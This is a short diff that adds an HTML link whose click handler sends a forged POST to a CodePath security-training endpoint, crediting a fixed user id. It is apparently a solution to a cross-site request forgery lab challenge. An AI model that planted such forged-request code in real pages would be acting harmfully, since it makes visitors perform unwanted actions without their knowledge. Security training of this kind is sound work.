@@ -1,0 +1,14 @@
+<div id="intro-button-wrapper">
+        <a href="#" "="" id=" button_codepath" onclick="codePathXss()">Click here</a>
+        <script>
+            function codePathXss() {
+                var xhr = new XMLHttpRequest();
+                var url =
+                    "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=455f95a0b1693f6eaefd2d24d1655162c19dfba0"
+                xhr.open("POST", url, true);
+                xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+                xhr.send();
+                console.log("Hello World")
+            }
+        </script>
+    </div>
